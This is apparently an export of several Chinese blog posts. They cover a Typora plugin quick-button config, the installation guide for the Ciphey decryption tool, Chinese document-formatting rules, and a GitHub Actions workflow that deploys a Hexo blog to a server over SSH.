<div class="code-container" data-rel="Toml"><figure class="iseeu highlight toml"><table><tr><td class="code"><pre><span class="line"><span class="section">[MarkdownToCode]</span></span><br><span class="line"><span class="attr">name</span> = <span class="string">&quot;标注全部代码块&quot;</span>  <span class="comment"># 右键菜单中展示的名称</span></span><br><span class="line"><span class="attr">enable</span> = <span class="literal">true</span>         <span class="comment"># 是否启用此自定义插件</span></span><br><span class="line"><span class="attr">hide</span> = <span class="literal">true</span>           <span class="comment"># 是否在右键菜单中隐藏</span></span><br><span class="line"><span class="attr">order</span> = <span class="number">1</span>             <span class="comment"># 在右键菜单中的出现顺序（越大越排到后面，允许负数）</span></span><br><span class="line"></span><br><span class="line">    <span class="section">[MarkdownToCode.config]</span></span><br><span class="line">    <span class="attr">code</span> = <span class="string">&quot;python&quot;</span> <span class="comment">##这里引号内改为你想要格式化的编程语言</span></span><br></pre></td></tr></table></figure></div>

<p>这里引号内的内容改为你想要格式化的编程语言</p>
<h2 id="添加快捷按钮"><a href="#添加快捷按钮" class="headerlink" title="添加快捷按钮"></a>添加快捷按钮</h2><p>修改 <code>./plugin/global/settings/custom_plugin.user.toml</code>，添加配置</p>
<div class="code-container" data-rel="Toml"><figure class="iseeu highlight toml"><table><tr><td class="code"><pre><span class="line"><span class="section">[quickButton]</span></span><br><span class="line"><span class="section">[quickButton.config]</span></span><br><span class="line"><span class="comment">#   disable:      禁用此按钮</span></span><br><span class="line"><span class="comment">#   coordinate:   按钮坐标。往上为x轴正方向，往左为y轴正方向，从零开始计数</span></span><br><span class="line"><span class="comment">#   icon:         按钮图标。填入css class。支持font-awesome-4.1.0和ionicons-2.0.1，所有的图标及其对应的css class请参考：https://www.adfwebmagazine.jp/wp-content/uploads/test_v4.1.pdf  和  https://ionic.io/ionicons/v2</span></span><br><span class="line"><span class="comment">#   size(可选):    图标大小。默认17px</span></span><br><span class="line"><span class="comment">#   color(可选):   图标颜色。默认跟随当前主题的配色方案</span></span><br><span class="line"><span class="comment">#   bgColor(可选): 图标背景色。默认跟随当前主题的配色方案</span></span><br><span class="line"><span class="comment">#   hint:         提示信息</span></span><br><span class="line"><span class="comment">#   callback:     回调函数。采用pluginName.MethodName的形式（功能就像hotkey.default.toml中的plugin参数和function参数的合体）</span></span><br><span class="line"><span class="comment">#                     MethodName请通过阅读源码查找。如果您不懂代码，但还是想添加按钮，有个碰运气技巧：在【右键菜单-&gt;常用插件-&gt;自定义插件下的插件】基本都是XXX.callback，其余插件基本都是XXX.call</span></span><br><span class="line"><span class="comment">#   evil(危险):    自定义回调函数。功能同hotkey.default.toml中的evil参数（它能用的，这里也能用）。这里的文本内容会被eval()。如果设置此参数，callback参数会失效</span></span><br><span class="line"><span class="attr">buttons</span> = [</span><br><span class="line">    <span class="comment"># 默认的按钮</span></span><br><span class="line">    &#123; disable = <span class="literal">false</span>, coordinate = [<span class="number">0</span>, <span class="number">0</span>], hint = <span class="string">&quot;直达底部&quot;</span>, size = <span class="string">&quot;28px&quot;</span>, icon = <span class="string">&quot;fa fa-angle-down&quot;</span>, callback = <span class="string">&quot;go_top.goBottom&quot;</span> &#125;,</span><br><span class="line">    &#123; disable = <span class="literal">false</span>, coordinate = [<span class="number">1</span>, <span class="number">0</span>], hint = <span class="string">&quot;直达顶部&quot;</span>, size = <span class="string">&quot;28px&quot;</span>, icon = <span class="string">&quot;fa fa-angle-up&quot;</span>, callback = <span class="string">&quot;go_top.goTop&quot;</span> &#125;,</span><br><span class="line">    &#123; disable = <span class="literal">false</span>, coordinate = [<span class="number">2</span>, <span class="number">0</span>], hint = <span class="string">&quot;文字风格&quot;</span>, size = <span class="string">&quot;17px&quot;</span>, icon = <span class="string">&quot;fa fa-font&quot;</span>, callback = <span class="string">&quot;text_stylize.call&quot;</span> &#125;,</span><br><span class="line">    &#123; disable = <span class="literal">false</span>, coordinate = [<span class="number">3</span>, <span class="number">0</span>], hint = <span class="string">&quot;混排优化&quot;</span>, size = <span class="string">&quot;17px&quot;</span>, icon = <span class="string">&quot;fa fa-align-justify&quot;</span>, callback = <span class="string">&quot;md_padding.call&quot;</span> &#125;,</span><br><span class="line">    &#123; disable = <span class="literal">false</span>, coordinate = [<span class="number">0</span>, <span class="number">1</span>], hint = <span class="string">&quot;思维导图&quot;</span>, size = <span class="string">&quot;22px&quot;</span>, icon = <span class="string">&quot;fa fa-code-fork&quot;</span>, callback = <span class="string">&quot;markmap.onButtonClick&quot;</span> &#125;,</span><br><span class="line">    &#123; disable = <span class="literal">false</span>, coordinate = [<span class="number">1</span>, <span class="number">1</span>], hint = <span class="string">&quot;图片管理&quot;</span>, size = <span class="string">&quot;17px&quot;</span>, icon = <span class="string">&quot;fa fa-image&quot;</span>, callback = <span class="string">&quot;imageReviewer.callback&quot;</span> &#125;,</span><br><span class="line">    &#123; disable = <span class="literal">false</span>, coordinate = [<span class="number">2</span>, <span class="number">1</span>], hint = <span class="string">&quot;书签管理&quot;</span>, size = <span class="string">&quot;17px&quot;</span>, icon = <span class="string">&quot;fa fa-bookmark&quot;</span>, callback = <span class="string">&quot;scrollBookmarker.callback&quot;</span> &#125;,</span><br><span class="line">    &#123; disable = <span class="literal">false</span>, coordinate = [<span class="number">3</span>, <span class="number">1</span>], hint = <span class="string">&quot;高亮搜索&quot;</span>, size = <span class="string">&quot;17px&quot;</span>, icon = <span class="string">&quot;fa fa-search&quot;</span>, callback = <span class="string">&quot;search_multi.call&quot;</span> &#125;,</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 你的按钮</span></span><br><span class="line">    &#123; disable = <span class="literal">false</span>, coordinate = [<span class="number">4</span>, <span class="number">0</span>], hint = <span class="string">&quot;一键标注所有代码块&quot;</span>, size = <span class="string">&quot;17px&quot;</span>, icon = <span class="string">&quot;fa fa-code&quot;</span>, callback = <span class="string">&quot;MarkdownToCode.callback&quot;</span> &#125;,</span><br><span class="line">]</span><br></pre></td></tr></table></figure></div>

<p>重启 Typora 就可以在右下角看到添加的快捷按钮</p>
<h2 id="效果展示"><a href="#效果展示" class="headerlink" title="效果展示"></a>效果展示</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/Typora_plugin/MarkdownToCode/recording.gif"
                      alt="recording"
                ></p>
<hr>
<h2 id="鸣谢"><a href="#鸣谢" class="headerlink" title="鸣谢"></a>鸣谢</h2><p>感谢 Typora_plugin 作者，极大地方便了我的写作</p>
<p>感谢 ChatGPT，给了我代码写作的开头</p>
<ol>
<li><a class="link"   href="https://github.com/obgnail/typora_plugin/" >https://github.com/obgnail/typora_plugin/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
<li><a class="link"   href="https://w1ndys.top/" >https://w1ndys.top/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
<li><a class="link"   href="https://chat.openai.com/" >https://chat.openai.com/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
</ol>
]]></content>
      <categories>
        <category>技术教程</category>
        <category>Typora</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
        <tag>Typora</tag>
        <tag>Typora-plugin</tag>
      </tags>
  </entry>
  <entry>
    <title>全自动解密脚本Ciphey官方安装文档</title>
    <url>/posts/bc236d8e.html</url>
    <content><![CDATA[<h1 id="Python-3-7-and-above"><a href="#Python-3-7-and-above" class="headerlink" title="Python 3.7 and above"></a><a class="link"   href="https://github.com/Ciphey/Ciphey/wiki/Installation#python-37-and-above" >Python 3.7 and above<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></h1><p>On Linux run this command:</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 -m pip install ciphey --upgrade</span><br></pre></td></tr></table></figure></div>



<p>This will tell your default Python3 version to install Ciphey and upgrade it if it already exists.</p>
<p><strong>Ciphey only supports Python3.7 and above. Please upgrade Python or use the Docker image if you have a version below 3.7.</strong></p>
<p><strong>⚠️ Ciphey doesn’t work on Windows with Python 3.9+, use Python 3.7 or Python 3.8. Other platforms are fine with Python 3.9, Python 3.10 doesn’t work.</strong></p>
<p><strong>⚠️ Windows Python defaults to install 32-bit. Ciphey only supports 64-bit. Make sure you’re using 64-bit Python.</strong></p>
<h1 id="Docker"><a href="#Docker" class="headerlink" title="Docker"></a><a class="link"   href="https://github.com/Ciphey/Ciphey/wiki/Installation#docker" >Docker<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></h1><p><a class="link"   href="https://docs.docker.com/engine/install/" >See here for how to install Docker<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run -it --rm remnux/ciphey</span><br></pre></td></tr></table></figure></div>



<p>Our Docker image is maintained by <a class="link"   href="https://remnux.org/" >REMnux<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>. They have provided a guide on how to use it here. <a class="link"   href="https://docs.remnux.org/run-tools-in-containers/remnux-containers#ciphey" >https://docs.remnux.org/run-tools-in-containers/remnux-containers#ciphey<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<h1 id="Detailed-Explanation-for-Python-Installation"><a href="#Detailed-Explanation-for-Python-Installation" class="headerlink" title="Detailed Explanation for Python Installation"></a><a class="link"   href="https://github.com/Ciphey/Ciphey/wiki/Installation#detailed-explanation-for-python-installation" >Detailed Explanation for Python Installation<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></h1><p>To install Ciphey, you need 2 core things:</p>
<ol>
<li>Python3.7 or above</li>
<li>Pip (on Python 3)</li>
</ol>
<p>Check to see if Python is already installed. Run both of these commands:</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">python -c &quot;import sys; print(sys.version)&quot;</span><br></pre></td></tr></table></figure></div>



<p>And&#x2F;or</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 -c &quot;import sys; print(sys.version)&quot;</span><br></pre></td></tr></table></figure></div>



<p>If Python is installed, one of these commands will run and will output the version number. Ciphey only supports numbers higher than 3.7. If you see “2” or anything below “3.7”, we’ll need to install a more up to date version.</p>
<p>Make sure to note what command words. On your computer, if <code>python -c &quot;import sys; print(sys.version)&quot;</code> returns something higher or equal to “3.7”, then whenever you see <code>python3</code> instead write <code>python</code>.</p>
<p><strong>⚠️ Windows Warning ⚠️</strong> On Windows? Python defaults to install 32-bit. Ciphey only supports 64-bit. When you download Python from the website on Windows it defaults to 32-bit. Make sure to download 64 bit!</p>
<p>Go to this website <a class="link"   href="https://www.python.org/" >https://www.python.org/<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> and install Python3. Make sure the version is more than 3.7. By default, unless you explicitly choose a lower version, the version you install will &gt; 3.7.</p>
<p>Next, we need to install <strong>pip</strong>.</p>
<p>Pip is already installed by default in Python. We just need to upgrade it.</p>
<p><strong>On Linux or Mac OS</strong> run the command:</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip3 install -U pip</span><br></pre></td></tr></table></figure></div>



<p>Making sure to replace <code>pip3</code> with <code>pip</code> if you had to replace <code>python3</code> with <code>python</code>.</p>
<p><strong>On Windows</strong></p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">python -m pip install -U pip</span><br></pre></td></tr></table></figure></div>



<p>If these commands didn’t work, explore the official Pip guide for upgrading <a class="link"   href="https://pip.pypa.io/en/stable/installing/#upgrading-pip" >here<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>.</p>
<p>If you faced any errors with Pip, there’s a nice troubleshooting guide on installing Pip <a class="link"   href="https://packaging.python.org/tutorials/installing-packages/" >here<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>.</p>
<h2 id="Installing-Ciphey"><a href="#Installing-Ciphey" class="headerlink" title="Installing Ciphey"></a><a class="link"   href="https://github.com/Ciphey/Ciphey/wiki/Installation#installing-ciphey" >Installing Ciphey<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></h2><p>Run this command:</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 -m pip install -U ciphey</span><br></pre></td></tr></table></figure></div>



<p>Replace <code>python3</code> with <code>python</code> if you need to. If you’re not sure, read the previous section <code>Detailed Explanation</code>.</p>
<p>This command does many things:</p>
<ul>
<li>Uses Python3 (Ciphey only supports Python3.7 and above)</li>
<li>The -m flag tells Python to run the module</li>
<li>We are telling the version of pip inside Python3 to install something. The reason why we use Python3 to call Pip instead of calling Pip is that the version of Pip may differ from Python, or you may have multiple versions of Python installed or you may be in a virtual environment.</li>
<li>The -U flag says “upgrade”. Sometimes Python gets stuck on an older version of Ciphey, so if it does – it says to upgrade it.</li>
<li>“ciphey” is the name of the package we want to install.</li>
</ul>
<p><strong>Make sure you run this command in Terminal&#x2F;CMD&#x2F;PowerShell or whatever you use. Do not run this in Python’s IDLE.</strong></p>
<p>使用方法</p>
<p>ciphey -t “”</p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>工具</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>Crypto</tag>
      </tags>
  </entry>
  <entry>
    <title>公文写作基础知识</title>
    <url>/posts/4f542b80.html</url>
    <content><![CDATA[<h1 id="公文写作基础知识"><a href="#公文写作基础知识" class="headerlink" title="公文写作基础知识"></a>公文写作基础知识</h1><p>1.题目：（正标题：三号黑体；副标题：小三号楷体）<br> 2.“摘要”：（五号黑体），摘要内容（楷体五号）<br>3.“关键词”：（五号黑体），关键词内容（五号楷体，多个关键词之间用“；”隔开）。<br>4.正文小四号宋体，标题黑体小四号，正文行间距为1.5倍<br>5.参考文献：（小四号黑体），参考文献内容（五号楷体）。参考文献是作者写作论著时所参考的文献书目。<br>附：参考文献格式要求<br>参考文献格式要求<br>参考文献统一放在文章最后，序号用方括号[1][2][3]……标出，序号左顶格。参照ISO690及ISO690-2，每一参考文献条目的最后均以“.”结束。各类参考文献条目的编排格式及示例如下：<br>a. 专著、论文集、学位论文、报告<br>[序号]主要责任者.文献题名[文献类型标识].出版地：出版者，出版年.起止页码(任选).（中译本前要加国别）<br>[1] [英]M奥康诺尔著，王耀先译．科技书刊的编译工作[M].北京：人民教育出版社，1982.56－57.<br>[2] 辛希孟.信息技术与信息服务国际研讨会论文集：A集[C].北京：中国社会科学出版社，1994.<br>[3] 张筑生.微分半动力系统的不变集[D].北京：北京大学数学系数学研究所，1983.<br>[4] 冯西桥.核反应堆压力管道与压力容器的LBB分析[R].北京：清华大学核能技术设计研究院，1997.<br>b. 期刊文章<br>[序号]主要责任者.文献题名[J].刊名，年，卷(期)：起止页码.<br>[5] 何龄修.读顾城《南明史》[J].中国史研究，1998，(3)：167-173.<br>[6] 金显贺，王昌长，王忠东，等.一种用于在线检测局部放电的数字滤波技术[J].清华大学学报(自然科学版)，1993，33(4)：62-67.<br>c. 论文集中的析出文献<br>[序号]析出文献主要责任者.析出文献题名[A].原文献主要责任者(任选).原文献题名[C].出版地：出版者，出版年.析出文献起止页码.<br>[7] 钟文发.非线性规划在可燃毒物配置中的应用[A].赵玮.运筹学的理论与应用——中国运筹学会第五届大会论文集[C].西安：西安电子科技大学出版社，1996.468-471.<br>d. 报纸文章<br>[序号]主要责任者.文献题名[N].报纸名，出版日期(版次).<br>[8] 谢希德.创造学习的新思路[N].人民日报，1998-12-25(10).<br>e. 国际、国家标准<br>[序号]标准编号，标准名称[S].<br>[9] GB&#x2F;T16159-1996，汉语拼音正词法基本规则[S].<br>f. 专利<br>[序号]专利所有者.专利题名[P].专利国别：专利号，出版日期.<br>[10] 姜锡洲.一种温热外敷药制备方案[P].中国专利：881056073，1989-07-26.<br>g. 电子文献<br>[序号]主要责任者.电子文献题名[电子文献及载体类型标识].电子文献的出处或可获得地址，发表或更新日期&#x2F;引用日期(任选).<br>[11] 王明亮.关于中国学术期刊标准化数据库系统工程的进展[EB&#x2F;OL]. <a class="link"   href="http://www.cajcd.edu.cn/pub/wml.txt/980810-2.html,1998-08-16/1998-10-04" >http://www.cajcd.edu.cn/pub/wml.txt/980810-2.html,1998-08-16/1998-10-04<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>.<br>[12] 万锦坤.中国大学学报论文文摘(1983-1993).英文版[DB&#x2F;CD].北京:中国大百科全书出版社，1996.<br>h. 各种未定义类型的文献<br>[序号]主要责任者.文献题名[Z].出版地：出版者，出版年.</p>
<p>Word文档格式一般为：</p>
<p>①标题<font color='red'>方正小标宋简体</font>    <font color='blue'>二号</font>  不加粗 居中 段落固定值33磅</p>
<p>②标题与正文空一行（从正文开始打）</p>
<p>（空行字体字号与正文保持一致，仿宋三号固定值29磅）</p>
<p>③正文为<font color='red'>仿宋三号不加粗</font>，行间距固定值29磅。首行缩进2字符。两端对齐</p>
<p>3.标题：与正文缩进等相同、全部用中文字符</p>
<p>一级标题：黑体三号“一、XXXX”。</p>
<p>二级标题：楷体三号“（一）XXXX”。</p>
<p>三级标题：仿宋三号“1.XXXX”。</p>
<p>四级标题：仿宋三号“（1）XXXX”</p>
<p>4.Word表格</p>
<p>①标题方正小标宋简体二号不加粗居中。</p>
<p>②标题与表格间空一行，表格随内容适当调整。</p>
<p>③表格全部内容设置单元格格式居中对齐。</p>
<p>④注意标点。</p>
<p>⑤两个字的内容或人名中间空两格。</p>
<p>注：字体根据需要调整，三号，四号或小四。</p>
<p>5.其他注意点（视图选项）</p>
<p>①注意符号需为中文符号，区分中英文符号</p>
<p>如逗号, ， 冒号: ： 破折号- —— 括号( ) （ ）</p>
<p>②<strong>（根据实际情况进行增删）</strong></p>
]]></content>
      <categories>
        <category>学习笔记</category>
        <category>写作</category>
      </categories>
      <tags>
        <tag>写作</tag>
      </tags>
  </entry>
  <entry>
    <title>利用GithubAction实现Github推送代码后自动同步到服务器(可用于博客、静态页面的自动化更新)</title>
    <url>/posts/c0fcf8f3.html</url>
    <content><![CDATA[<h2 id="deploy-yml"><a href="#deploy-yml" class="headerlink" title="deploy.yml"></a>deploy.yml</h2><p>新建工作流文件 <code>.github/workflows/deploy.yml</code>，这里我以 Hexo 的自动化部署为例。</p>
<div class="code-container" data-rel="Yml"><figure class="iseeu highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">name:</span> <span class="string">Hexo</span> <span class="string">Deploy</span></span><br><span class="line"></span><br><span class="line"><span class="attr">on:</span></span><br><span class="line">  <span class="attr">push:</span></span><br><span class="line">    <span class="attr">branches:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">main</span></span><br><span class="line"><span class="attr">env:</span></span><br><span class="line">  <span class="attr">TZ:</span> <span class="string">Asia/Shanghai</span></span><br><span class="line"></span><br><span class="line"><span class="attr">jobs:</span></span><br><span class="line">  <span class="attr">build:</span></span><br><span class="line">    <span class="attr">runs-on:</span> <span class="string">ubuntu-latest</span></span><br><span class="line"></span><br><span class="line">    <span class="attr">steps:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Checkout</span> <span class="string">source</span></span><br><span class="line">        <span class="attr">uses:</span> <span class="string">actions/checkout@v2</span></span><br><span class="line">        <span class="attr">with:</span></span><br><span class="line">          <span class="attr">ref:</span> <span class="string">main</span></span><br><span class="line"></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Setup</span> <span class="string">Node.js</span></span><br><span class="line">        <span class="attr">uses:</span> <span class="string">actions/setup-node@v1</span></span><br><span class="line">        <span class="attr">with:</span></span><br><span class="line">          <span class="attr">node-version:</span> <span class="string">&quot;20&quot;</span></span><br><span class="line"></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Setup</span> <span class="string">Hexo</span></span><br><span class="line">        <span class="attr">env:</span></span><br><span class="line">          <span class="attr">ACTION_DEPLOY_KEY:</span> <span class="string">$&#123;&#123;</span> <span class="string">secrets.DEPLOY_KEY</span> <span class="string">&#125;&#125;</span></span><br><span class="line">        <span class="attr">run:</span> <span class="string">|</span></span><br><span class="line"><span class="string">          mkdir -p ~/.ssh/</span></span><br><span class="line"><span class="string">          echo &quot;$ACTION_DEPLOY_KEY&quot; | tr -d &#x27;\r&#x27; &gt; ~/.ssh/id_rsa</span></span><br><span class="line"><span class="string">          chmod 700 ~/.ssh</span></span><br><span class="line"><span class="string">          chmod 600 ~/.ssh/id_rsa</span></span><br><span class="line"><span class="string">          ssh-keyscan github.com &gt;&gt; ~/.ssh/known_hosts</span></span><br><span class="line"><span class="string">          ssh-keyscan gitee.com &gt;&gt; ~/.ssh/known_hosts</span></span><br><span class="line"><span class="string">          git config --global user.email &quot;你的邮箱&quot;</span></span><br><span class="line"><span class="string">          git config --global user.name &quot;你的用户名&quot;</span></span><br><span class="line"><span class="string">          git config --global init.defaultBranch main</span></span><br><span class="line"><span class="string">          npm install hexo-cli -g</span></span><br><span class="line"><span class="string">          npm install</span></span><br><span class="line"><span class="string"></span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Deploy</span></span><br><span class="line">        <span class="attr">run:</span> <span class="string">|</span></span><br><span class="line"><span class="string">          hexo clean</span></span><br><span class="line"><span class="string">          hexo generate</span></span><br><span class="line"><span class="string">          hexo deploy</span></span><br><span class="line"><span class="string"></span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">ECS</span> <span class="string">clone</span> <span class="comment"># 连接服务器并克隆</span></span><br><span class="line">        <span class="attr">uses:</span> <span class="string">cross-the-world/ssh-pipeline@master</span></span><br><span class="line">        <span class="attr">env:</span></span><br><span class="line">          <span class="attr">WELCOME:</span> <span class="string">&quot;ssh pipeline&quot;</span></span><br><span class="line">        <span class="attr">with:</span></span><br><span class="line">          <span class="attr">host:</span> <span class="string">$&#123;&#123;</span> <span class="string">secrets.USER_HOST</span> <span class="string">&#125;&#125;</span> <span class="comment"># 服务器的 IP 地址</span></span><br><span class="line">          <span class="attr">user:</span> <span class="string">$&#123;&#123;</span> <span class="string">secrets.USER_NAME</span> <span class="string">&#125;&#125;</span> <span class="comment"># 服务器的用户名</span></span><br><span class="line">          <span class="attr">pass:</span> <span class="string">$&#123;&#123;</span> <span class="string">secrets.USER_PASS</span> <span class="string">&#125;&#125;</span> <span class="comment"># 服务器的密码</span></span><br><span class="line">          <span class="attr">connect_timeout:</span> <span class="string">10s</span></span><br><span class="line">          <span class="attr">script:</span></span><br><span class="line">            <span class="string">|</span> <span class="comment"># 连接服务器并克隆，进入目录并删除旧的文件，移动新的文件，删除.git并修改权限</span></span><br><span class="line">            <span class="string">cd</span> <span class="string">$&#123;&#123;</span> <span class="string">secrets.ECS_SITE</span> <span class="string">&#125;&#125;</span></span><br><span class="line">            <span class="string">git</span> <span class="string">clone</span> <span class="string">--depth</span> <span class="number">1</span> <span class="string">-b</span> <span class="string">gh-pages</span> <span class="string">https://ghp.ci/https://github.com/$&#123;&#123;</span> <span class="string">secrets.GH_USERNAME</span> <span class="string">&#125;&#125;/$&#123;&#123;</span> <span class="string">secrets.GH_REPO</span> <span class="string">&#125;&#125;.git</span></span><br><span class="line">            <span class="string">rm</span> <span class="string">-rf</span> <span class="string">index</span></span><br><span class="line">            <span class="string">mv</span> <span class="string">$&#123;&#123;</span> <span class="string">secrets.GH_REPO</span> <span class="string">&#125;&#125;</span> <span class="string">index</span></span><br><span class="line">            <span class="string">cd</span> <span class="string">index</span></span><br><span class="line">            <span class="string">rm</span> <span class="string">-rf</span> <span class="string">.git</span></span><br><span class="line">            <span class="string">chown</span> <span class="string">-R</span> <span class="number">1000</span><span class="string">:1000</span> <span class="string">.</span></span><br></pre></td></tr></table></figure></div>

<h2 id="工作流解释"><a href="#工作流解释" class="headerlink" title="工作流解释"></a>工作流解释</h2><p>这个 GitHub Actions 工作流文件 <code>deploy.yml</code> 主要用于在代码推送到 GitHub 仓库的 <code>main</code> 分支后，自动化部署 Hexo 博客，并将更新同步到服务器。以下是各个步骤的详细解释：</p>
<ol>
<li><p><strong>工作流名称和触发条件</strong>：</p>
<ul>
<li><code>name: Hexo Deploy</code>：定义工作流的名称。</li>
<li><code>on: push: branches: - main</code>：当代码推送到 <code>main</code> 分支时触发工作流。</li>
</ul>
</li>
<li><p><strong>环境变量</strong>：</p>
<ul>
<li><code>env: TZ: Asia/Shanghai</code>：设置时区为上海时间。</li>
</ul>
</li>
<li><p><strong>工作任务</strong>：</p>
<ul>
<li><code>jobs: build: runs-on: ubuntu-latest</code>：定义一个名为 <code>build</code> 的任务，运行在最新的 Ubuntu 环境上。</li>
</ul>
</li>
<li><p><strong>步骤</strong>：</p>
<ul>
<li><p><code>steps:</code>：定义一系列步骤来执行任务。</p>
</li>
<li><p><strong>Checkout 源代码</strong>：</p>
<ul>
<li><code>name: Checkout source</code>：使用 <code>actions/checkout@v2</code> 操作从 <code>main</code> 分支检出代码。</li>
</ul>
</li>
<li><p><strong>设置 Node.js</strong>：</p>
<ul>
<li><code>name: Setup Node.js</code>：使用 <code>actions/setup-node@v1</code> 操作设置 Node.js 环境，版本为 <code>20</code>。</li>
</ul>
</li>
<li><p><strong>设置 Hexo</strong>：</p>
<ul>
<li><code>name: Setup Hexo</code>：配置 Hexo 环境。</li>
<li><code>env: ACTION_DEPLOY_KEY: $&#123;&#123; secrets.DEPLOY_KEY &#125;&#125;</code>：使用 GitHub Secrets 中的 <code>DEPLOY_KEY</code>。</li>
<li><code>run:</code>：执行一系列命令来配置 SSH 密钥、全局 Git 配置和安装 Hexo 及其依赖。</li>
<li>注意这一步要在脚本中修改自己的邮箱和用户名。</li>
</ul>
</li>
<li><p><strong>部署 Hexo</strong>：</p>
<ul>
<li><code>name: Deploy</code>：运行 Hexo 部署命令。</li>
<li><code>run:</code>：执行 <code>hexo clean</code>、<code>hexo generate</code> 和 <code>hexo deploy</code> 命令来清理、生成和部署 Hexo 博客。</li>
</ul>
</li>
<li><p><strong>连接服务器并克隆</strong>（关键步骤）：</p>
<ul>
<li><code>name: ECS clone</code>：使用 <code>cross-the-world/ssh-pipeline@master</code> 操作连接服务器并克隆代码。</li>
<li><code>env: WELCOME: &quot;ssh pipeline&quot;</code>：设置环境变量。</li>
<li><code>with:</code>：提供服务器的 IP 地址、用户名和密码等信息。</li>
<li><code>script:</code>：执行一系列命令来连接服务器、克隆仓库、删除旧文件、移动新文件、删除 <code>.git</code> 目录并修改权限。</li>
<li><code>git clone --depth 1 -b gh-pages https://ghp.ci/https://github.com/$&#123;&#123; secrets.GH_USERNAME &#125;&#125;/$&#123;&#123; secrets.GH_REPO &#125;&#125;.git</code> 这一行是关键，通过克隆分支 <code>gh-pages</code> 来部署静态页面，并且只进行浅层克隆，节省了时间，其中可以根据自己的实际情况进行修改。</li>
</ul>
</li>
</ul>
</li>
</ol>
<h2 id="配置-Secrets"><a href="#配置-Secrets" class="headerlink" title="配置 Secrets"></a>配置 Secrets</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://pic1.zhimg.com/80/v2-27d495be4c864da8c07582d4fa2b1b17.png"
                      alt="v2-27d495be4c864da8c07582d4fa2b1b17.png (720×349)"
                ></p>
<p>在仓库的 <code>Settings</code> -&gt; <code>Secrets</code> 中添加以下 Secrets：</p>
<ul>
<li><code>USER_HOST</code>：服务器的 IP 地址</li>
<li><code>USER_NAME</code>：服务器的登录用户名</li>
<li><code>USER_PASS</code>：服务器的登录密码</li>
<li><code>ECS_SITE</code>：服务器上 Hexo 博客（或其他静态文件）的目录</li>
<li><code>GH_USERNAME</code>：GitHub 用户名</li>
<li><code>GH_REPO</code>：GitHub 仓库名</li>
<li><code>DEPLOY_KEY</code>：用于生成静态文件推送到 GitHub 的 SSH 密钥</li>
</ul>
<h2 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h2><ul>
<li>使用 SSH 密钥连接服务器，避免了每次部署时输入密码的麻烦。</li>
<li>通过 GitHub Actions 实现自动化部署，提高了效率。</li>
<li>使用 <code>ghp.ci</code> 代理克隆，解决了大陆地区访问 GitHub 慢的问题，并且不需要使用国内 Gitee 等平台进行中转。</li>
<li>支持多种静态页面部署，如 Hexo、VuePress 等。</li>
</ul>
]]></content>
      <categories>
        <category>技术教程</category>
        <category>Github</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
        <tag>GithubAction</tag>
        <tag>自动化部署</tag>
      </tags>
  </entry>
  <entry>
    <title>关于Mkdocs-material日期显示不准确的一种平替方法</title>
    <url>/posts/512a6b20.html</url>
    <content><![CDATA[<p>本文另有英文版：<a href="https://blog.w1ndys.top/posts/fa88f28c">https://blog.w1ndys.top/posts/fa88f28c</a></p>
<p><font color="red">注意：</font>更高效的方法：<a class="link"   href="https://github.com/squidfunk/mkdocs-material/discussions/7135#discussioncomment-9277842" >https://github.com/squidfunk/mkdocs-material/discussions/7135#discussioncomment-9277842<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
